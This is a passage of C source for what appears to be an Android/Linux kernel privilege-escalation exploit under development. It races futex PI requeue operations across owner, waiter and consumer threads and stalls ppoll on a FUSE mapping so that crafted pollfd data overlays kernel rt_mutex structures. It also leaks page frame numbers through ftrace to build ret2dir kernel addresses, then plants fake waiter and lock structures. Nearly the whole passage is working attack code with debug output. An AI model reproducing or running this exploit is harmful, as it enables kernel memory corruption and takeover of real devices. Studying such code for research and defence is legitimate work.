    printf("[r2d] fakerq %s on_rq=0x%x prio=0x%x nprio=0x%x sclass=0x%016llx "
           "pi_top=0x%016llx usage=0x%x comm=%.16s\n",
           tag, (unsigned)(*(uint32_t *)(pr + 0x78)),
           (unsigned)(*(uint32_t *)(pr + 0x84)),
           (unsigned)(*(uint32_t *)(pr + 0x7c)),
           (unsigned long long)qload(pr + 0x90),
           (unsigned long long)qload(pr + 0x8a8),
           (unsigned)(*(uint32_t *)(pr + 0x38)),
           (char *)(pr + 0x7a8));
    printf("[r2d] cfs %s load=0x%016llx last=0x%016llx tg=0x%016llx\n",
           tag,
           (unsigned long long)qload(pr + 0xa0),
           (unsigned long long)qload(pr + 0x100),
           (unsigned long long)qload(pr + 0x150));
  }
  if (g_watch_fp) {
    fprintf(g_watch_fp,
            "%s mag=%.7s wlock=0x%08x rb=0x%llx left=0x%llx owner=0x%llx "
            "sclass=0x%llx pi_top=0x%llx\n",
            tag, (char *)p, (unsigned)(*(uint32_t *)(p + MUTEX_OFF)),
            (unsigned long long)qload(p + MUTEX_OFF + 8),
            (unsigned long long)qload(p + MUTEX_OFF + 0x10),
            (unsigned long long)qload(p + MUTEX_OFF + 0x18),
            (unsigned long long)qload(p + 0x90),
            (unsigned long long)qload(p + 0x8a8));
    fflush(g_watch_fp);
  }
  scan_page_kptrs(tag);
}

static void put_qword_template(struct pollfd *pf, unsigned long task,
                               unsigned long lock) {
  pf[10].events = (short)(task & 0xffffUL);
  pf[10].revents = (short)((task >> 16) & 0xffffUL);
  pf[11].fd = (int)(int32_t)((task >> 32) & 0xffffffffUL);
  pf[11].events = (short)(lock & 0xffffUL);
  pf[11].revents = (short)((lock >> 16) & 0xffffUL);
  pf[12].fd = (int)(int32_t)((lock >> 32) & 0xffffffffUL);
}

static void setup_overlay_pollfds(struct pollfd *pf) {
  for (int i = 0; i < E1_PPOLL_NFDS; ++i) {
    if ((size_t)((i + 1) * (int)sizeof(struct pollfd)) > (size_t)g_first_bytes)
      break;
    pf[i].fd = -1;
    pf[i].events = POLLIN;
    pf[i].revents = 0;
  }
  /* old_node tree_entry at copy+36: parent/right/left = 0 so rb_erase
     treats the smashed node as an isolated root and does not walk junk. */
  pf[4].events = 0;
  pf[4].revents = 0;
  pf[5].fd = 0;
  pf[5].events = 0;
  pf[5].revents = 0;
  pf[6].fd = 0;
  pf[6].events = 0;
  pf[6].revents = 0;
  pf[7].fd = 0;
  pf[7].events = 0;
  pf[7].revents = 0;
  pf[8].fd = 0;
  pf[8].events = 0;
  pf[8].revents = 0;
  pf[9].fd = 0;
  pf[9].events = 0;
  pf[9].revents = 0;
  pf[10].fd = 0;
  put_qword_template(pf, g_task_q, g_lock_q);
}

static void dump_proc_file(const char *label, const char *path) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    printf("[r2d] %s open %s errno=%d\n", label, path, errno);
    return;
  }
  char buf[2048];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n < 0) {
    printf("[r2d] %s read errno=%d\n", label, errno);
    return;
  }
  buf[n] = 0;
  printf("[r2d] %s:\n%s", label, buf);
  if (n == 0 || buf[n - 1] != '\n') printf("\n");
}

static void dump_tid_kinfo(const char *who, pid_t tid) {
  char path[128];
  printf("[r2d] kinfo %s tid=%d\n", who, (int)tid);
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", (int)tid);
  dump_proc_file("syscall", path);
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", (int)tid);
  dump_proc_file("wchan", path);
  snprintf(path, sizeof(path), "/proc/self/task/%d/stack", (int)tid);
  dump_proc_file("stack", path);
}

static int set_nice_tid(pid_t tid, int niceval, const char *tag) {
  errno = 0;
  int r = setpriority(PRIO_PROCESS, tid, niceval);
  int e = errno;
  int now = getpriority(PRIO_PROCESS, tid);
  printf("[r2d] setpriority %s tid=%d want=%d ret=%d errno=%d now=%d\n",
         tag, tid, niceval, r, e, now);
  return r;
}

static int start_listen_proxy(void) {
  int srv = socket(AF_UNIX, SOCK_STREAM, 0);
  if (srv < 0) {
    printf("[r2d] socket errno=%d\n", errno);
    return -1;
  }
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  addr.sun_path[0] = '\0';
  memcpy(addr.sun_path + 1, "e1c3fuse", 8);
  socklen_t len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + 8);
  if (bind(srv, (struct sockaddr *)&addr, len) != 0) {
    printf("[r2d] bind errno=%d\n", errno);
    close(srv);
    return -1;
  }
  if (listen(srv, 1) != 0) {
    printf("[r2d] listen errno=%d\n", errno);
    close(srv);
    return -1;
  }
  g_listen_fd = srv;
  printf("[r2d] listening abstract e1c3fuse\n");
  return 0;
}

static int recv_proxy_fd(void) {
  int srv = g_listen_fd;
  if (srv < 0) {
    printf("[r2d] listen fd missing\n");
    return -1;
  }
  int conn = accept(srv, NULL, NULL);
  if (conn < 0) {
    printf("[r2d] accept errno=%d\n", errno);
    close(srv);
    return -1;
  }
  char buf[8];
  struct iovec iov = {.iov_base = buf, .iov_len = sizeof(buf)};
  char cmsgbuf[CMSG_SPACE(sizeof(int))];
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  msg.msg_control = cmsgbuf;
  msg.msg_controllen = sizeof(cmsgbuf);
  ssize_t n = recvmsg(conn, &msg, 0);
  int fd = -1;
  if (n >= 0) {
    for (struct cmsghdr *c = CMSG_FIRSTHDR(&msg); c; c = CMSG_NXTHDR(&msg, c)) {
      if (c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
        memcpy(&fd, CMSG_DATA(c), sizeof(fd));
        break;
      }
    }
  }
  printf("[r2d] recvmsg n=%zd fd=%d errno=%d\n", n, fd, errno);
  close(conn);
  close(srv);
  return fd;
}

static int wait_flag_ms(volatile int *flag, int want, int timeout_ms) {
  struct timespec t0, t1;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  while (__atomic_load_n(flag, __ATOMIC_SEQ_CST) != want) {
    clock_gettime(CLOCK_MONOTONIC, &t1);
    if (ns_delta(&t0, &t1) > (long)timeout_ms * 1000000L) return -1;
    usleep(1000);
  }
  return 0;
}

static void dump_pi_trace(void) {
  int fd = open(TR "/trace", O_RDONLY);
  if (fd < 0) {
    printf("[r2d] trace open errno=%d\n", errno);
    return;
  }
  char buf[8192], line[1024];
  size_t used = 0;
  int hits = 0;
  printf("[r2d] ===== PI TRACE BEGIN =====\n");
  for (;;) {
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n <= 0) break;
    for (ssize_t i = 0; i < n; ++i) {
      if (used + 1 >= sizeof(line)) used = 0;
      line[used++] = buf[i];
      if (buf[i] != '\n') continue;
      line[used] = 0;
      if (strstr(line, "sched_pi_setprio") || strstr(line, "e1c6_ret2dir")) {
        fwrite(line, 1, used, stdout);
        hits++;
      }
      used = 0;
    }
  }
  close(fd);
  printf("[r2d] ===== PI TRACE END hits=%d =====\n", hits);
}

static void *watch_thread(void *unused) {
  (void)unused;
  unsigned char *p = (unsigned char *)g_page;
  unsigned char *pt = (unsigned char *)(g_owner_is_rq && g_page_rq ? g_page_rq : g_page_task);
  uint32_t peak_wl = 0;
  uint64_t peak_rb = 0, peak_left = 0;
  uint64_t base_rb = 0, base_left = 0;
  int logged = 0, logged_class = 0;
  if (p) {
    base_rb = qload(p + MUTEX_OFF + 8);
    base_left = qload(p + MUTEX_OFF + 0x10);
    printf("[r2d] watch baseline rb=0x%llx left=0x%llx owner=0x%llx taskpage=%p oldclass=0x%llx\n",
           (unsigned long long)base_rb, (unsigned long long)base_left,
           (unsigned long long)qload(p + MUTEX_OFF + 0x18), g_page_task,
           (unsigned long long)g_old_class_q);
  }
  while (__atomic_load_n(&g_watch, __ATOMIC_SEQ_CST)) {
    if (p) {
      uint32_t wl = *(volatile uint32_t *)(p + MUTEX_OFF);
      uint64_t rb = qload(p + MUTEX_OFF + 8);
      uint64_t left = qload(p + MUTEX_OFF + 0x10);
      if (wl > peak_wl) peak_wl = wl;
      if (rb != base_rb) peak_rb = rb;
      if (left != base_left) peak_left = left;
      if ((wl || rb != base_rb || left != base_left) && !logged) {
        logged = 1;
        g_saw_change = 1;
        printf("[r2d] WATCH CHANGE wlock=0x%08x rb=0x%016llx left=0x%016llx\n",
               (unsigned)wl, (unsigned long long)rb, (unsigned long long)left);
        dump_page("watch-change");
        dump_page_raw("watch-change");
        dump_mem_raw("watch-task-at-rb", g_page_task);
      }
    }
    if (pt) {
      uint64_t sclass = *(volatile uint64_t *)(pt + 0x90);
      uint64_t pitop = *(volatile uint64_t *)(pt + 0x8a8);
      if (sclass != g_old_class_q)
        g_peak_sclass = sclass;
      if (pitop)
        g_peak_pitop = pitop;
      if (!logged_class && ((sclass && sclass != g_old_class_q) || pitop)) {
        logged_class = 1;
        g_saw_change = 1;
        dump_sclass_txt(sclass, pitop);
        dump_mem_raw("watch-task", pt);
        dump_page_raw("watch-mutex-at-class");
        printf("[r2d] CLASS CHANGE sclass=0x%llx pitop=0x%llx old=0x%llx\n",
               (unsigned long long)sclass, (unsigned long long)pitop,
               (unsigned long long)g_old_class_q);
      }
    }
  }
  g_peak_wlock = peak_wl;
  g_peak_rb = peak_rb;
  g_peak_left = peak_left;
  printf("[r2d] peak wlock=0x%x rb=0x%llx left=0x%llx sclass=0x%llx pitop=0x%llx saw=%d class=%d\n",
         peak_wl, (unsigned long long)peak_rb, (unsigned long long)peak_left,
         (unsigned long long)g_peak_sclass, (unsigned long long)g_peak_pitop,
         logged, logged_class);
  dump_page("watch-end");
  dump_mem_raw("watch-task-end", g_page_task);
  return NULL;
}

static int leak_pfn_and_map(void) {
  int attempt;
  wr_sys(TR "/tracing_on", "0\n");
  wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
  wr_sys(TR "/buffer_size_kb", "8192\n");
  print_sys_state("pre-leak");

  for (attempt = 0; attempt < 3; attempt++) {
    wr_sys(TR "/tracing_on", "0\n");
    wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
    if (clear_trace() != 0) {
      printf("[r2d] clear_trace failed attempt=%d\n", attempt);
      continue;
    }
    wr_sys(TR "/tracing_on", "1\n");
    wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n");
    print_sys_state("armed");

    char path[128];
    snprintf(path, sizeof(path), "/data/local/tmp/e1c6_r2d_%d_%d.bin", getpid(), attempt);
    unlink(path);
    int fd = open(path, O_RDWR | O_CREAT | O_EXCL, 0600);
    if (fd < 0) {
      printf("[r2d] creat errno=%d\n", errno);
      wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
      continue;
    }
    unsigned char buf[PAGE * 3];
    memset(buf, 0, sizeof(buf));
    memcpy(buf, MAGIC, 7);
    memcpy(buf + PAGE, "E1C6TSK", 7);
    memcpy(buf + PAGE * 2, "E1C6CFS", 7);
    if (write(fd, buf, sizeof(buf)) != (ssize_t)sizeof(buf)) {
      printf("[r2d] write page errno=%d\n", errno);
      wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
      close(fd);
      continue;
    }
    fsync(fd);
    {
      void *tmp = mmap(NULL, PAGE * 3, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
      if (tmp != MAP_FAILED) {
        volatile char c0 = *(volatile char *)tmp;
        volatile char c1 = *((volatile char *)tmp + PAGE);
        volatile char c2 = *((volatile char *)tmp + PAGE * 2);
        (void)c0; (void)c1; (void)c2;
        munmap(tmp, PAGE * 3);
      }
    }
    usleep(200000);
    wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");

    struct stat st;
    if (fstat(fd, &st) != 0) {
      printf("[r2d] fstat errno=%d\n", errno);
      close(fd);
      continue;
    }
    printf("[r2d] path=%s ino=%lu ino_hex=%lx size=%ld attempt=%d\n", path,
           (unsigned long)st.st_ino, (unsigned long)st.st_ino, (long)st.st_size, attempt);

    int tfd = open(TR "/trace", O_RDONLY);
    if (tfd < 0) {
      printf("[r2d] trace open errno=%d\n", errno);
      close(fd);
      continue;
    }
    char *tbuf = malloc(2 << 20);
    if (!tbuf) {
      close(tfd);
      close(fd);
      return -1;
    }
    ssize_t n = read(tfd, tbuf, (2 << 20) - 1);
    close(tfd);
    if (n < 0) {
      printf("[r2d] trace read errno=%d\n", errno);
      free(tbuf);
      close(fd);
      continue;
    }
    tbuf[n] = 0;
    printf("[r2d] trace_bytes=%zd\n", n);
    {
      int hdr = 0;
      char *hp = tbuf;
      while (hdr < 6 && *hp) {
        char *nl = strchr(hp, '\n');
        int len = nl ? (int)(nl - hp) : (int)strlen(hp);
        printf("[r2d] trace_hdr %.*s\n", len, hp);
        hdr++;
        if (!nl) break;
        hp = nl + 1;
      }
    }

    char inohex[64], inodec[64];
    snprintf(inohex, sizeof(inohex), "ino %lx", (unsigned long)st.st_ino);
    snprintf(inodec, sizeof(inodec), "ino %lu", (unsigned long)st.st_ino);
    int hits = 0;
    unsigned long pfn = 0, pfn1 = 0, pfn2 = 0;
    char *save = tbuf;
    char *line;
    int filemap_lines = 0;
    char last[8][256];
    int last_n = 0;
    while ((line = strsep(&save, "\n")) != NULL) {
      if (!strstr(line, "mm_filemap_add_to_page_cache")) continue;
      filemap_lines++;
      snprintf(last[last_n % 8], sizeof(last[0]), "%s", line);
      last_n++;
      if (filemap_lines <= 4)
        printf("[r2d] filemap_first %s\n", line);
      if (!ino_token_in_line(line, inohex) && !ino_token_in_line(line, inodec))
        continue;
      printf("[r2d] HIT %s\n", line);
      const char *pp = strstr(line, "pfn=0x");
      const char *op = strstr(line, " ofs=");
      unsigned long ofs = 0;
      if (op)
        ofs = strtoul(op + 5, NULL, 0);
      if (pp) {
        unsigned long v = strtoul(pp + 6, NULL, 16);
        if (v) {
          if (ofs == 0)
            pfn = v;
          else if (ofs == PAGE || ofs == 4096)
            pfn1 = v;
          else if (ofs == PAGE * 2 || ofs == 8192)
            pfn2 = v;
          hits++;
        }
      }
    }
    {
      int show = last_n < 8 ? last_n : 8;
      int start_i = last_n < 8 ? 0 : last_n - 8;
      for (int i = 0; i < show; i++)
        printf("[r2d] filemap_last %s\n", last[(start_i + i) % 8]);
    }
    printf("[r2d] filemap_lines=%d hits=%d pfn0=0x%lx pfn1=0x%lx pfn2=0x%lx needles='%s'/'%s'\n",
           filemap_lines, hits, pfn, pfn1, pfn2, inohex, inodec);
    free(tbuf);
    if (hits == 0 || pfn == 0) {
      printf("[r2d] no pfn hit attempt=%d\n", attempt);
      close(fd);
      continue;
    }
    if (pfn1 == 0 || pfn2 == 0) {
      printf("[r2d] missing pfn1/pfn2 attempt=%d pfn1=0x%lx pfn2=0x%lx\n", attempt, pfn1, pfn2);
      close(fd);
      continue;
    }

    unsigned long long phys = (unsigned long long)pfn << 12;
    unsigned long long kva = PAGE_OFFSET + phys - MEMSTART_ADDR;
    unsigned long long phys1 = (unsigned long long)pfn1 << 12;
    unsigned long long kva1 = PAGE_OFFSET + phys1 - MEMSTART_ADDR;
    unsigned long long phys2 = (unsigned long long)pfn2 << 12;
    unsigned long long kva2 = PAGE_OFFSET + phys2 - MEMSTART_ADDR;
    printf("[r2d] pfn=0x%lx phys=0x%llx kva_off32b=0x%llx (memstart=0x80000000 start_pfn=0x80000)\n", pfn, phys, kva);
    printf("[r2d] pfn1=0x%lx phys1=0x%llx kva1_off32b=0x%llx\n", pfn1, phys1, kva1);
    printf("[r2d] pfn2=0x%lx phys2=0x%llx kva2_off32b=0x%llx\n", pfn2, phys2, kva2);
    printf("[r2d] kva_phys0=0x%llx kva_off32g=0x%llx (NOT USED: phys0=neighbor, off32g=HOLE)\n",
           PAGE_OFFSET + phys, PAGE_OFFSET + phys - 0x800000000ULL);
    /* 0x1800000000 = 96GB covers lowRAM+hole+highRAM span. Not the inverted
       win24 heuristic. off32b of this-boot file pages sits at +32..+43GB. */
    if (kva < PAGE_OFFSET || kva >= PAGE_OFFSET + 0x1800000000ULL) {
      printf("[r2d] kva outside physmap span, abort this page\n");
      close(fd);
      continue;
    }

    void *map = mmap(NULL, PAGE * 3, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
      printf("[r2d] mmap errno=%d\n", errno);
      close(fd);
      continue;
    }
    if (memcmp(map, MAGIC, 7) != 0) {
      printf("[r2d] magic mismatch after mmap: %.7s\n", (char *)map);
      munmap(map, PAGE * 3);
      close(fd);
      continue;
    }
    memset((char *)map + 8, 0, PAGE - 8);
    memcpy(map, MAGIC, 7);
    memset((char *)map + PAGE + 8, 0, PAGE - 8);
    memcpy((char *)map + PAGE, "E1C6TSK", 7);
    memset((char *)map + PAGE * 2 + 8, 0, PAGE - 8);
    memcpy((char *)map + PAGE * 2, "E1C6CFS", 7);
    /* Dummy waiter at +0x80: black root of overlay lock, so w22=1
       does not take the empty-tree NULL+0x18 path (8.11 run8/run10). */
    {
      unsigned long kva_now = (unsigned long)(PAGE_OFFSET + ((unsigned long long)pfn << 12) - MEMSTART_ADDR);
      unsigned char *pg = (unsigned char *)map;
      qstore(pg + 0x80, 1ULL);           /* tree_entry parent_color = black root */
      qstore(pg + 0x88, 0);              /* rb_right */
      qstore(pg + 0x90, 0);              /* rb_left */
      qstore(pg + 0x80 + 0x38, kva_now + MUTEX_OFF); /* waiter->lock */
      qstore(pg + MUTEX_OFF + 0x08, kva_now + 0x80); /* rb_root */
      qstore(pg + MUTEX_OFF + 0x10, kva_now + 0x80); /* leftmost */
      *(uint32_t *)(pg + MUTEX_OFF) = 0; /* wait_lock */
      qstore(pg + MUTEX_OFF + 0x18, 0);  /* owner */
    }
    mlock(map, PAGE * 3);

    g_page_fd = fd;
    g_page = map;
    g_page_task = (char *)map + PAGE;
    g_page_rq = (char *)map + PAGE * 2;
    g_pfn = pfn;
    g_pfn_task = pfn1;
    g_pfn_rq = pfn2;
    g_kva = (unsigned long)kva;
    g_kva_task = (unsigned long)kva1;
    g_kva_rq = (unsigned long)kva2;
    g_task_q = g_lock_only ? 0 : g_kva;
    g_lock_q = g_kva + MUTEX_OFF;
    dump_page("after-map");
    printf("[r2d] overlay lock_only=%d task=0x%lx lock=0x%lx taskpage_kva=0x%lx (off32b only)\n",
           g_lock_only, g_task_q, g_lock_q, g_kva_task);
    wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
    return 0;
  }
  wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
  printf("[r2d] no pfn hit, abort overlay\n");
  return -1;
}

static int prep_stalled_ppoll(void) {
  const size_t map_len = page_sz * MAP_PAGES;
  const size_t stall_off = page_sz * (size_t)g_stall_page;
  if (g_ppoll_area) {
    munmap(g_ppoll_area, g_ppoll_map_len);
    g_ppoll_area = NULL;
    g_ppoll_pf = NULL;
  }
  unlink("/data/local/tmp/fusestall.release");
  unlink("/data/local/tmp/fusestall.arm");
  posix_fadvise(g_proxy_fd, 0, (off_t)map_len, POSIX_FADV_RANDOM);
  void *area = mmap(NULL, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, g_proxy_fd, 0);
  if (area == MAP_FAILED) {
    printf("[r2d] mmap fuse errno=%d\n", errno);
    return -1;
  }
  if (stall_off > 0) {
    void *anon = mmap(area, stall_off, PROT_READ | PROT_WRITE,
                      MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (anon != area) {
      printf("[r2d] mmap anon-prefix errno=%d got=%p want=%p\n", errno, anon, area);
      munmap(area, map_len);
      return -1;
    }
  }
  memset(area, 0, stall_off);
  posix_fadvise(g_proxy_fd, (off_t)stall_off, (off_t)page_sz, POSIX_FADV_DONTNEED);
  madvise((char *)area + stall_off, page_sz, MADV_DONTNEED);

  char *base = (char *)area + stall_off - (size_t)g_first_bytes;
  struct pollfd *pf = (struct pollfd *)base;
  setup_overlay_pollfds(pf);
  printf("[r2d] leftover-preserve prep on main; waiter will ppoll with zero syscalls\n");
  printf("[r2d] template task=0x%016lx lock=0x%016lx "
         "p4(ev=%#x rev=%#x) p5(fd=%#x ev=%#x rev=%#x) p6(fd=%#x ev=%#x) "
         "p10(ev=%#x rev=%#x) p11(fd=%#x ev=%#x rev=%#x) p12(fd=%#x)\n",
         g_task_q, g_lock_q, (unsigned)(uint16_t)pf[4].events,
         (unsigned)(uint16_t)pf[4].revents, (unsigned)pf[5].fd,
         (unsigned)(uint16_t)pf[5].events, (unsigned)(uint16_t)pf[5].revents,
         (unsigned)pf[6].fd, (unsigned)(uint16_t)pf[6].events,
         (unsigned)(uint16_t)pf[10].events, (unsigned)(uint16_t)pf[10].revents,
         (unsigned)pf[11].fd, (unsigned)(uint16_t)pf[11].events,
         (unsigned)(uint16_t)pf[11].revents, (unsigned)pf[12].fd);
  printf("[r2d] ppoll_cross base=%p first_bytes=%d stall=%p anon_prefix=%zu stall_page=%d\n",
         pf, g_first_bytes, (char *)area + stall_off, stall_off, g_stall_page);
  printf("[r2d] overlay_qwords task@+84=0x%016llx lock@+92=0x%016llx tree@+36=0x%016llx\n",
         (unsigned long long)qload((char *)pf + 84),
         (unsigned long long)qload((char *)pf + 92),
         (unsigned long long)qload((char *)pf + 36));
  g_ppoll_area = area;
  g_ppoll_map_len = map_len;
  g_ppoll_pf = pf;
  return 0;
}

static int fire_stalled_ppoll(void) {
  struct pollfd *pf = g_ppoll_pf;
  if (!pf) {
    g_ppoll_ret = -1;
    g_ppoll_errno = EINVAL;
    return -1;
  }
  /* Zero syscalls before ppoll: t0 is stamped on main at arm. */
  __atomic_store_n(&g_in_ppoll, 1, __ATOMIC_SEQ_CST);
  errno = 0;
  int ret = ppoll(pf, E1_PPOLL_NFDS, g_ppoll_tsp, g_ppoll_sigmask);
  int e = errno;
  clock_gettime(CLOCK_MONOTONIC, &g_ppoll_t1);
  g_ppoll_ret = ret;
  g_ppoll_errno = e;
  __atomic_store_n(&g_in_ppoll, 2, __ATOMIC_SEQ_CST);
  return 0;
}

static void *owner_thread(void *unused) {
  (void)unused;
  g_owner_tid = mytid();
  errno = 0;
  long ret = ftx(&f_target, FUTEX_LOCK_PI, 0, NULL, NULL);
  print_ret("owner LOCK_PI(target)", ret, errno);
  if (ret != 0) return NULL;
  __atomic_store_n(&owner_ready, 1, __ATOMIC_SEQ_CST);
  wait_flag_ms(&chain_held, 1, 8000);
  /* E1c-2 topology: owner holds target, waiter holds chain and is
     blocked on target. LOCK_PI(chain) should EDEADLK (or time out).
     Not prewarm — this is the emulator oracle's deadlock edge. */
  {
    struct timespec abs;
    clock_gettime(CLOCK_REALTIME, &abs);
    abs.tv_sec += 1;
    errno = 0;
    ret = ftx(&f_chain, FUTEX_LOCK_PI, 0, &abs, NULL);
    print_ret("owner LOCK_PI(chain)", ret, errno);
    if (ret == 0) {
      errno = 0;
      long ur = ftx(&f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL);
      print_ret("owner UNLOCK_PI(chain)", ur, errno);
    }
  }
  wait_flag_ms(&requeue_done, 1, 8000);
  /* Hold target until overlay window ends so waiter times out. */
  if (wait_flag_ms(&consumer_done, 1, 8000) != 0)
    printf("[r2d] owner: consumer_done timeout, unlocking target anyway\n");
  errno = 0;
  ret = ftx(&f_target, FUTEX_UNLOCK_PI, 0, NULL, NULL);
  print_ret("owner UNLOCK_PI(target)", ret, errno);
  return NULL;
}

static void *waiter_thread(void *unused) {
  (void)unused;
  g_waiter_tid = mytid();
  set_nice_tid(g_waiter_tid, 19, "waiter");
  errno = 0;
  long ret = ftx(&f_chain, FUTEX_LOCK_PI, 0, NULL, NULL);
  print_ret("waiter LOCK_PI(chain)", ret, errno);
  if (ret != 0) return NULL;
  __atomic_store_n(&chain_held, 1, __ATOMIC_SEQ_CST);
  wait_flag_ms(&owner_ready, 1, 8000);
  __atomic_store_n(&waiter_waiting, 1, __ATOMIC_SEQ_CST);
  /* 8.18: E1b/E1c-2 geometry is TIMEOUT (errno=110). 5.15 treats
     WAIT_REQUEUE_PI utime as absolute CLOCK_MONOTONIC (E1c-2 {10,0}
     only worked because emulator uptime was <10s). */
  struct timespec wrq_to;
  clock_gettime(CLOCK_MONOTONIC, &wrq_to);
  wrq_to.tv_sec += 2;
  errno = 0;
  ret = ftx(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &wrq_to, &f_target);
  g_wait_requeue_ret = ret;
  g_wait_requeue_errno = errno;
  fire_stalled_ppoll();
  print_ret("waiter WAIT_REQUEUE_PI", g_wait_requeue_ret, g_wait_requeue_errno);
  print_ret("ppoll", g_ppoll_ret, g_ppoll_errno);
  printf("[r2d] ppoll dt_ms=%.3f (leftover-preserve)\n",
         ns_delta(&g_ppoll_t0, &g_ppoll_t1) / 1e6);
  errno = 0;
  ret = ftx(&f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL);
  print_ret("waiter UNLOCK_PI(chain)", ret, errno);
  return NULL;
}

static void *consumer_thread(void *unused) {
  (void)unused;
  g_consumer_tid = mytid();
  set_nice_tid(g_consumer_tid, -20, "consumer-high");
  struct timespec t0, t1;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  for (;;) {
    if (__atomic_load_n(&g_in_ppoll, __ATOMIC_SEQ_CST) == 1) {
      clock_gettime(CLOCK_MONOTONIC, &t1);
      if (ns_delta(&g_ppoll_t0, &t1) > 100000000L) {
        __atomic_store_n(&stall_held, 1, __ATOMIC_SEQ_CST);
        break;
      }
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    if (ns_delta(&t0, &t1) > 8000000000L) {
      printf("[r2d] consumer timeout waiting for stall in_ppoll=%d\n", g_in_ppoll);
      return NULL;
    }
    usleep(2000);
  }
  printf("[r2d] consumer stage=stall_held, LOCK_PI(chain) during copy window tid=%d nice=%d\n",
         g_consumer_tid, getpriority(PRIO_PROCESS, g_consumer_tid));
  dump_page("pre-consumer");
  __atomic_store_n(&consumer_started, 1, __ATOMIC_SEQ_CST);
  struct timespec abs;
  clock_gettime(CLOCK_REALTIME, &abs);
  abs.tv_sec += 8;
  clock_gettime(CLOCK_MONOTONIC, &g_cons_t0);
  errno = 0;
  long ret = ftx(&f_chain, FUTEX_LOCK_PI, 0, &abs, NULL);
  int e = errno;
  clock_gettime(CLOCK_MONOTONIC, &g_cons_t1);
  g_consumer_ret = ret;
  g_consumer_errno = e;
  print_ret("consumer LOCK_PI(chain)", ret, e);
  printf("[r2d] consumer lock dt_ms=%.3f\n", ns_delta(&g_cons_t0, &g_cons_t1) / 1e6);
  dump_page("post-consumer");
  if (ret == 0) {
    errno = 0;
    long ur = ftx(&f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL);
    print_ret("consumer UNLOCK_PI(chain)", ur, errno);
  }
  __atomic_store_n(&consumer_done, 1, __ATOMIC_SEQ_CST);
  return NULL;
}

static void test_window(void) {
  printf("==== B2 + FUSE stall ret2dir first_bytes=%d lock=0x%lx ====\n",
         g_first_bytes, g_lock_q);
  owner_ready = chain_held = waiter_waiting = requeue_done = 0;
  stall_held = consumer_started = consumer_done = 0;
  g_in_ppoll = 0;
  f_wait = f_target = f_chain = 0;

  wr_sys(TR "/events/sched/sched_switch/enable", "0\n");
  wr_sys(TR "/events/sched/sched_pi_setprio/enable", "1\n");
  wr_sys(TR "/tracing_on", "0\n");
  clear_trace();
  wr_sys(TR "/tracing_on", "1\n");
  wr_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");

  pthread_t owner, waiter, consumer, watch, cwatch;
  if (prep_stalled_ppoll() != 0) {
    printf("[r2d] prep_stalled_ppoll failed\n");
    return;
  }
  __atomic_store_n(&g_watch, 1, __ATOMIC_SEQ_CST);
  pthread_create(&watch, NULL, watch_thread, NULL);
  pthread_create(&cwatch, NULL, class_watch_thread, NULL);
  pthread_create(&owner, NULL, owner_thread, NULL);
  pthread_create(&waiter, NULL, waiter_thread, NULL);
  pthread_create(&consumer, NULL, consumer_thread, NULL);

  if (wait_flag_ms(&waiter_waiting, 1, 8000) || wait_flag_ms(&owner_ready, 1, 8000)) {
    printf("[r2d] setup timeout\n");
  }
  usleep(200000);
  posix_fadvise(g_proxy_fd, (off_t)(page_sz * (size_t)g_stall_page),
                (off_t)page_sz, POSIX_FADV_DONTNEED);
  if (g_ppoll_area)
    madvise((char *)g_ppoll_area + page_sz * (size_t)g_stall_page, page_sz, MADV_DONTNEED);
  wr_file("/data/local/tmp/fusestall.arm", "1\n");
  clock_gettime(CLOCK_MONOTONIC, &g_ppoll_t0);
  printf("[r2d] armed FUSE on main before CMP_REQUEUE_PI depth=%s tsp=%p sig=%p\n",
         g_depth_name ? g_depth_name : "?", (void *)g_ppoll_tsp, (void *)g_ppoll_sigmask);
  errno = 0;
  long ret = ftx(&f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                 (const struct timespec *)1, &f_target);
  print_ret("main CMP_REQUEUE_PI", ret, errno);
  __atomic_store_n(&requeue_done, 1, __ATOMIC_SEQ_CST);

  if (wait_flag_ms(&stall_held, 1, 8000) != 0)
    printf("[r2d] stall_held timeout in_ppoll=%d\n", g_in_ppoll);
  else
    printf("[r2d] stall_held confirmed in_ppoll=%d\n", g_in_ppoll);

  if (wait_flag_ms(&consumer_started, 1, 8000) != 0)
    printf("[r2d] consumer_started timeout\n");
  else {
    printf("[r2d] consumer entered LOCK_PI while ppoll stalled; holding 250ms\n");
    dump_page("during-hold-0");
    dump_tid_kinfo("waiter", g_waiter_tid);
    dump_tid_kinfo("consumer", g_consumer_tid);
    usleep(80000);
    dump_page("during-hold-80");
    usleep(80000);
    dump_page("during-hold-160");
    usleep(90000);
    dump_page("during-hold-250");
  }

